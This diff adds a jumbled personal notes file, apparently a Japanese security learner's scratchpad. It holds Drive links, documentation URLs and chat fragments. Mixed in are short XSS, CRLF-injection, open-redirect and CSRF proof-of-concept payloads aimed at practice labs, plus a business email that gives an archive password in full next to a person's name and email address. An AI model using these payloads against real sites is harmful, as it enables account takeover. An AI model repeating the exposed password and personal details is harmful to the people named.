@@ -1,0 +1,468 @@
+
+
+
+https://docs.paloaltonetworks.com/pan-os/10-1/pan-os-upgrade/apis-for-upgrade/use-the-api-for-upgrade-tasks
+https://docs.paloaltonetworks.com/pan-os/10-2/pan-os-panorama-api/get-started-with-the-pan-os-rest-api
+
+
+https://docs.paloaltonetworks.com/pan-os/10-2/pan-os-panorama-api/get-started-with-the-pan-os-rest-api/access-the-rest-api#id0e536ca4-6154-4188-b70f-227c2c113ec4
+
+https://www.paloaltonetworks.com/blog/category/technical-documentation/
+
+https://docs.paloaltonetworks.com/resources/eol#q=pan-os%20upgrade%20guide&sort=relevancy&layout=card&numberOfResults=25&f:@panproductcategory=[PAN-OS,Panorama,VM-Series]&f:@panosversion=[10.0%20(EoL)]&f:@language=[ja_JP,en_us]
+
+https://docs.paloaltonetworks.com/content/dam/techdocs/ja_JP/pdf/vm-series/10-0/vm-series-deployment-10-0-ja-jp.pdf
+https://docs.paloaltonetworks.com/content/dam/techdocs/ja_JP/pdf/pan-os/10-0/pan-os-admin-10-0-ja-jp.pdf
+
+
+
+2024年1月27日(土) 18:02 Masashi UNO <masa3170160@gmail.com>:
+j9H%p0B&aT8
+
+
+Neo Guilde19:59
+https://drive.google.com/file/d/1sj8bLgb2-MTA8r3FvP-jl4P6TekjIasV/view?usp=sharing
+Neo Guilde21:05
+test%0d%0aSet-Cookie:+csrfKey=abc
+https://drive.google.com/file/d/1sj8bLgb2-MTA8r3FvP-jl4P6TekjIasV/view?usp=sharing
+Neo Guilde21:18
+<html> <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="test3@mai.com"> <input type="hidden" name="csrf" value="wk4vjq2M4dfEm3YGjMFo34AADVqppUxC"> </form> <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20 SameSite=None" onerror="document.forms[0].submit()"> <script> document.forms[0].submit(); </script> </html>
+
+send
+メッセージを送信
+ファイルにアクセスできるユーザーを確認しています
+21:19
+avr-vjzy-pof
+
+
+
+
+https://drive.google.com/file/d/1sj8bLgb2-MTA8r3FvP-jl4P6TekjIasV/view?usp=sharing
+
+
+https://drive.google.com/file/d/1hjS6hbKgERJ74fNgqMGzUioXT-zr7GKA/view?usp=drive_link
+
+
+https://drive.google.com/file/d/1MoGCXTHoMhUijsq5zW3LpycqPMRktKgd/view?usp=drive_link
+
+
+https://drive.google.com/file/d/1UYDBDLKuemYLPklgHh1KoxLbyzLesSfZ/view?usp=drive_link
+
+
+認定エシカルハッカー(CEH)オンライン模擬試験 (cagy.org)
+Introduction - Rust By Example (rust-lang.org)
+暗号化 - Win32 apps | Microsoft Learn
+マスタリングGhidra ―基礎から学ぶリバースエンジニアリング完全マニュアル | Chris Eagle, Kara Nance, 石川 朝久, 中島 将太, 小竹 泰一, 原 弘明 |本 | 通販 | Amazon
+
+Find the best GPTs of ChatGPT | GPTStore.AI
+GPTs ChatGPT の一覧 |GPTStore.AI
+
+WEST-SEC セキュリティ勉強会#3 - HackMD
+Exam 312-49v10 Dumps Questions and Answers in PDF format (vceplus.io)
+
+
+
+Neo Guilde20:00
+https://drive.google.com/file/d/1mLoZQh3WhjkMuGY4NA_tP8VM13jrxEeQ/view?usp=sharing
+
+
+https://gptstore.ai/gpts
+
+https://drive.google.com/file/d/10TdhuPD1jo3NnjUrLW-M_pxXLDgbwD8C/view?usp=sharing
+
+
+https://drive.google.com/file/d/1EvSGmH4d0ZpUAqphtGxocaH88SDSETis/view?usp=sharing
+
+
+https://drive.google.com/file/d/1ojwMX-buLdncWDlZ2u2Jj1s1MztrpAw-/view?usp=sharing
+
+
+https://drive.google.com/file/d/1i0gOtYkWe9aTBmPvlHiVcaxsfR6nVJTU/view?usp=drive_link
+
+https://drive.google.com/file/d/19huk82Bv3n-pjBd7bfWM_rk0-XPQOmzc/view?usp=drive_link
+https://drive.google.com/file/d/1zHWwwI7MTXGZPqnN3u53ZyF66US5PmIC/view?usp=drive_link
+
+
+https://drive.google.com/file/d/1qKqcMcvICLxPkGAhEZMPwxYYeAUWuJDz/view?usp=drive_link
+
+https://drive.google.com/file/d/1zHWwwI7MTXGZPqnN3u53ZyF66US5PmIC/view?usp=sharing
+
+https://drive.google.com/file/d/19huk82Bv3n-pjBd7bfWM_rk0-XPQOmzc/view?usp=sharing
+
+https://drive.google.com/file/d/1P87GTz1aI-OLi6JppEXz-OcnZC-vq1OX/view?usp=sharing
+
+https://drive.google.com/file/d/18Rv3c1qZgkhf8MMHldXLpD8NLI2I-Qh5/view?usp=sharing
+
+https://drive.google.com/file/d/18Rv3c1qZgkhf8MMHldXLpD8NLI2I-Qh5/view?usp=sharing
+
+https://www.tracelabs.org/initiatives/osint-vm
+
+https://www.tracelabs.org/
+
+google lab
+https://colab.research.google.com/?hl=ja
+
+https://drive.google.com/file/d/1RgK-EDhNVhNTjRh4c-PGziZHVTZaWMGt/view?usp=sharing
+
+https://drive.google.com/file/d/1Xeiz0djdb3pwLbrq6X83RF4F177knOCL/view?usp=sharing
+
+
+https://drive.google.com/file/d/1g3sCqmcrlU0dALzUbbEkhz23t391NVrD/view?usp=sharing
+
+https://drive.google.com/file/d/1I3rtOKhYr0SWCoBUjZJCAiBKE32Wq-0x/view?usp=sharing
+
+https://drive.google.com/file/d/1RtaZAcNCPuUUADx7BvuQNjZ_jI3iPfRs/view?usp=sharing
+https://drive.google.com/file/d/1QTtBKHFZ6-BrPi5Z2ECABFDvkVW7Y8pv/view?usp=sharing
+
+https://drive.google.com/file/d/1KONZjFn7-fJaVG-1WiC9qHGkYNg-USOh/view?usp=sharing
+
+<img src=q onerror=alert(8)>
+
+https://drive.google.com/file/d/1nH5d71l1rMMR1esbL7G_EEwlkhjRcXeG/view?usp=sharing
+
+https://drive.google.com/file/d/1g3sCqmcrlU0dALzUbbEkhz23t391NVrD/view?usp=sharing
+
+
+https://www.youtube.com/watch?v=tkqVoFk6CqA&t=947s
+
+https://techcommunity.microsoft.com/#
+
+https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/introducing-a-unified-security-operations-platform-with/ba-p/3983341
+
+19:40] Yoichi Ishikawa
+SIEM and XDR Solutions | Microsoft Security
+SIEM and XDR Solutions | Microsoft Security
+Get integrated cloud-native SIEM and XDR solutions from Microsoft Security to secure your multicloud, multiplatform environment against threats.
+[19:45] Yoichi Ishikawa
+https://youtu.be/tkqVoFk6CqA?si=OWhr4ZEY4F8_Devn&t=947
+The Future of Security with A…
+43:11 | 1.7K views | 10 hours ago
+
+
+https://teams.microsoft.com/l/message/19:meeting_MDE5ZDJiYTEtNGFiYy00YTBhLTk4ZDUtYzgxZWQ3ODdkM2I3@thread.v2/1700735991063?context=%7B%22contextType%22%3A%22chat%22%7D
+
+https://youtu.be/tkqVoFk6CqA?si=OWhr4ZEY4F8_Devn&t=947
+
+https://www.microsoft.com/ja-jp/security/business/ai-machine-learning/microsoft-security-copilot?rtc=1
+
+
+
+Neo Guilde19:59
+https://drive.google.com/file/d/1cj_f2xNzjbAKxVE3nMr3rzkBYNYKn8wl/view?usp=sharing
+
+
+https://drive.google.com/file/d/1wP6IL-5rtMDlupggRapzeWKKGeCOCyFz/view?usp=sharing
+
+
+https://drive.google.com/file/d/1cj_f2xNzjbAKxVE3nMr3rzkBYNYKn8wl/view?usp=sharing
+
+
+a-zara-n (a_zara_n) · GitHub
+
+https://drive.google.com/file/d/1w8krb1BKKV6zjngqJ6lmQ1KYfcfLJlpm/view?usp=sharing
+
+
+PayloadsAllTheThings/Server Side Request Forgery at master · swisskyrepo/PayloadsAllTheThings · GitHub
+
+
+8割解けるCTF「WEST-SEC」
+
+WEST-SEC セキュリティ勉強会#3 - HackMD
+
+
+https://drive.google.com/file/d/1TIfS-csPRmsKEBTFfjToWBljFSbKfIeq/view?usp=sharing
+https://drive.google.com/file/d/13ubpW2P_QvRgR1u_XigudhdqsvFvZIiI/view?usp=sharing
+
+
+
+https://drive.google.com/file/d/1X2DhzCU23c4SlGcyZiNmpJ-l5Zc0dTA_/view?usp=sharing
+
+
+https://drive.google.com/file/d/1rM8_7Y5YKUA-aOW5_UfGy5WafT3LEDWF/view?usp=sharing
+
+
+https://drive.google.com/file/d/1j-oBk5JnUn6pwxlb6Yap3nQfNJiI21cX/view?usp=sharing
+
+
+https://drive.google.com/file/d/1Y5XzBGpVvQ-Xt96wTVz8Ey85YBd6iR8x/view?usp=sharing
+
+
+https://drive.google.com/file/d/17SL61TiT4nARFMVzawHxWUTAbvHaZg-A/view?usp=sharing
+
+
+
+https://drive.google.com/file/d/1qNd841ChvDIVNlq0cytfQ2WGp3-DLqCK/view?usp=sharing
+
+https://drive.google.com/file/d/1Rj73GqgLEuevykJT_ujVdCCXaR58Rght/view?usp=sharing
+
+
+https://drive.google.com/file/d/11AYnTf9RcUqjWXmVYZvMWTUTaxIzJmlx/view?usp=drive_link
+
+<script>document.getElementById("csrf-form").submit();</script>
+
+
+Neo Guilde19:58
+https://drive.google.com/file/d/1OrXJS8cao4E18GTDITEV2f2PiRqbbrrI/view?usp=sharing
+
+
+https://drive.google.com/file/d/1Zer6ApGb6Ke2jIxlep70vo4YV5MI3Ov3/view?usp=drive_link
+https://drive.google.com/file/d/1Zer6ApGb6Ke2jIxlep70vo4YV5MI3Ov3/view?usp=drive_link
+
+https://drive.google.com/file/d/1uQPwygV1Ceme-h-ZjrJRFJk5WDMRAEZA/view?usp=sharing
+
+
+masa0610713/renshu: 練習 (github.com)
+github.com/masa0610713/renshu
+
+BB-021.pdf - Google ドライブ
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+
+testphp.vulnweb.com/
+
+https://drive.google.com/file/d/1Gd1Osw9LPskym7gjvJVKO_59iKQOTGk4/view?usp=sharing
+
+
+https://drive.google.com/file/d/1MXTVH1ICtkV7QtJQW4s4m8WV_KjGCIL2/view?usp=sharing
+
+https://drive.google.com/file/d/1N469Wortjys5Pw3lkeGh0LDx67rk3sdj/view?usp=sharing
+
+https://drive.google.com/file/d/1ccVW5H5EYnKPTBo5hxeoNkTkrwGD_Jlx/view?usp=sharing
+
+https://www.whitelisteddomain.tld@google.com/%2f..
+https://github.com/bkimminich/juice-shop@google.com/%2f..
+
+
+https://levetty.notion.site/RedSecurity-Web-ad9cba24bc5740a188eda434a8b2766f
+
+
+https://drive.google.com/file/d/1aSVgkO_0-tCi5xRxfVH4obHIGilYsXC4/view?usp=drive_link
+
+
+https://drive.google.com/file/d/1KKjH_exzaIFQxaq0oTon-G0l4MWSHGDW/view?usp=drive_link
+
+<html> <form action="http://10.4.128.215:42000/profile" method="POST"> <input type="" name="username" value="test0" /> <input type="submit" value="Submit request" /> </form> </html>
+
+
+https://drive.google.com/file/d/1zRuDXYZsCMY8-iZBe8yQUUPD1MfskoG7/view?usp=sharing
+
+
+
+https://drive.google.com/file/d/1_wru1lr1ro2cCmn-s-q8n4pObGwa3p9x/view?usp=sharing
+Neo Guilde20:31
+https://portswigger.net/web-security/all-labs
+
+
+https://drive.google.com/file/d/1SVRWjKNEUa0Qz3M_o2hWUT820Es0WuAR/view?usp=drive_link
+
+
+
+Bypassing Login Screens (SMO+)
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens
+Command Injection Cheatsheet
+https://hackersonlineclub.com/command-injection-cheatsheet/
+MD5 Center
+https://md5.gromweb.com/?md5=4f5fffa7b2340178a716e3832451e058
+https://www.stonebeat.co.jp/profile/
+
+
+
+https://drive.google.com/file/d/1EbWBoqTNa7Fue8QaGV0MIsyMJEWDErnE/view?usp=sharing
+
+
+https://drive.google.com/file/d/1NNrG9H5x5fG0CMVW1COdt6HmRMb296RL/view?usp=sharing
+
+
+＊＊
+https://qiita.com/il-m-yamagishi/items/8709de06be33e7051fd2
+https://qiita.com/leomaro7/items/bb1b46693614b05df7bd
+https://qiita.com/Perplex/items/30f949fe261f56af7476
+https://installati.one/install-keepassx-kalilinux/
+https://linux.how2shout.com/install-keepass-password-manager-on-ubuntu-20-04-lts/
+https://www.javadrive.jp/apache/php/index7.html
+https://owasp.org/Top10/ja/
+https://www.ipa.go.jp/security/10threats/10threats2023.html
+＊＊＊
+
+
+
+
+https://drive.google.com/file/d/19SQClOunSyUkF94n9FgRUZP2Bcm0K2qb/view?usp=drive_link
+
+
+https://drive.google.com/file/d/1x0sTaeAf9YAsiHcDGsQWvdu7Ks4ymmPL/view?usp=sharing
+
+
+https://drive.google.com/file/d/1V5L8hSdbdQpMI1fam5ASPyanYp1_OVG6/view?usp=sharing
+
+https://drive.google.com/file/d/1mWBJZL7BpNsgM2KyhBGUlX57HhVJUAtM/view?usp=sharing
+
+
+https://drive.google.com/file/d/1hAETm3IAjA76bTmBiYTjp9dasVcmYfbg/view?usp=drive_link
+
+
+https://drive.google.com/file/d/1w1RF_QwiQC2pdYsFgREjkgelR9DZoM6R/view?usp=sharing
+
+
+
+https://cysec148.hatenablog.com/entry/2023/07/16/164856
+
+https://drive.google.com/file/d/1GtHlj0pmY620CHdEI8xzkn5h5FDye-ZQ/view?usp=sharing
+
+https://cysec148.hatenablog.com/entry/2023/07/16/161702
+https://cysec148.hatenablog.com/entry/2023/07/16/164856
+
+https://drive.google.com/file/d/1QG73BcCItT5WSYY692wspLvYc_w_2bCn/view?usp=sharing
+
+https://www.revshells.com/
+
+https://jpn.nec.com/cybersecurity/topics/2022/PR005_hardening_project.html
+
+ログイン先を選択して自動ログインを行うTeratermマクロ(ログイン先ごとに読込むiniファイルを分ける) | 俺的備忘録 〜なんかいろいろ〜 (orebibou.com)
+SSHAutoLogin.ttl(自動ログインマクロ本体)
+host.list(自動ログインを行うホストのリストファイル)
+command.list(自動ログイン実行時に実行させるコマンドのリスト)
+log(ログを出力させるフォルダ)
+iniファイル(読み込ませるiniファイル)
+
+【B-XXXX】案件エントリー可否一覧表（鵜野様用） - Google スプレッドシート
+
+
+
+https://drive.google.com/file/d/1nsqypd9Xre4yWcq_iA-Jw7YEUzr1-d_h/view?usp=sharing
+https://www.exploit-db.com/google-hacking-database
+https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=ja
+
+
+
+株式会社アズールドットネット　佐藤様
+CC: NTTデータ 大森様
+
+お世話になっております。
+Heyday 鵜野でございます。
+
+先程送付致しました添付ファイルの解凍パスワードは、下記となります。
+
+j9H%p0B&aT8
+
+以上、よろしくお願いいたします。
+
+
+amazon
+j9--
+
+
+スカイチケット高速バスの予約確認 | スカイチケット (skyticket.jp)
+
+image.png
+image.png
+image.png
+https://drive.google.com/file/d/1ZJgZKvz_8GL9GBrdGBY0Y5PRURDAJE00/view?usp=sharing
+
+Software Downloads and Documentation - A10 Support (a10networks.com)
+5coin
+maps100%maps100%
+
+Communication error with LB process
+A10 vthunderマニュアル（Ver 5.2.1） | KDDIクラウドプラットフォームサービス ナレッジサイト
+
+ACOS_vThunder_5_2_1-p3_70.iso
+ACOS_vThunder_5_2_1-p3_70.ova
+
+https://drive.google.com/file/d/15TLzIBpfvSEp7q-Zw6ZfzoXdKBJfpket/view?usp=sharing
+
+
+Neo Guilde19:37
+https://drive.google.com/file/d/15TLzIBpfvSEp7q-Zw6ZfzoXdKBJfpket/view?usp=sharing
+Neo Guilde20:22
+"role":""
+Neo Guilde20:25
+"role":"customer",
+Neo Guilde20:35
+"deletedAt":null
+Neo Guilde20:43
+https://www.sqlite.org/schematab.htm
+https://www.sqlite.org/schematab.html
+https://www.sqlite.org/schematab.html
+bht-xbob-jrr
+
+
+https://drive.google.com/file/d/1RqqRlrYh9vA0S0GxWk-Y1ao8yBikXLs-/view?usp=sharing
+
+
+https://drive.google.com/file/d/1by_j8uqFRLdQVhB5O-H2Z_XlmWO8bwH9/view?usp=sharing
+
+
+セキュリティ資格「CISSP」とは？難易度や出題範囲など資格詳細やおすすめ学習法を解説 (freelance-start.com)
+
+https://fs.isc2chapter.jp/f/Ize7oAZ36mmrK4td/CISSP%E6%9C%80%E7%B5%82%E7%89%88v5-%E8%A1%A8%E7%B4%99%E4%BB%98.pdf
+
+Neo Guilde19:42
+<s>test</s>
+Neo Guilde20:05
+';alert(1)//
+Neo Guilde20:08
+';alert(document.domain)//
+Neo Guilde20:33
+"><script>alert(1)</script>
+Neo Guilde20:42
+</span><script>alert(1)</script>
+Neo Guilde20:45
+</span></section><script>alert(1)</script>
+Neo Guilde20:47
+<img src=x onerror=alert(1)>
+Neo Guilde20:54
+以下の脆弱性は、自動診断だけでは不十分かと思います。
+
+XSS
+IDOR/BOLA
+SSTI
+CORS
+XXEi
+CSRF
+以下の脆弱性診断については、自動化に最適かと思います。
+
+HTTP Request Smuggling
+Input Reflection
+Out-of-Band / DNS
+Open Redirection
+Host Header Injection
+Directory traversal, LFI, RFI
+noc-oexp-qok
+
+
+https://piedpin.com/top/courses/
+intext: Vulnerbility disclosure intitle: Security Bounty Program
+Neo Guilde19:28
+intext: Vulnerbility disclosure intitle: Security Bounty Program
+https://drive.google.com/file/d/1u6-nwpt7Jsx3tXT3rTel7uD_qMP4-5Es/view?usp=sharing
+sji-hzav-mtd
+
+
+
+https://drive.google.com/file/d/13aGR9hS7tAoS8cghyAvTCesFcPN-7zhU/view?usp=sharing
+https://drive.google.com/file/d/1f-z2bMiDvmdM8OQ_eIefN6GaJFtLqIAB/view?usp=sharing
+cva-cbhr-qxg
+https://github.com/humblelad/Shodan-Dorks
+https://github.com/topics/shodan-dorks
+https://github.com/mathis2001/Dorking/blob/main/ShodanDorks.txt
+
+
+
+
+https://drive.google.com/file/d/1fb3Ue3FpQefGyiXZfxdnsDXnvOxFFw-d/view?usp=sharing
+
+https://drive.google.com/file/d/122FECSosLSF7fA00JAWdqf3vySR9dQnx/view?usp=sharing
+
+
+Neo Guilde20:36
+https://hashtoolkit.com/
+Neo Guilde20:44
+https://drive.google.com/file/d/1puFbOOIc9GEc3uMJUr3FceY8Zlv9CCXJ/view?usp=sharing
+
+
+https://drive.google.com/file/d/1aRqqUzYMgpzlKoZhS0PnNRQCpSxUS11s/view?usp=sharing
+https://drive.google.com/file/d/1aRqqUzYMgpzlKoZhS0PnNRQCpSxUS11s/view?usp=sharing
+
+
+
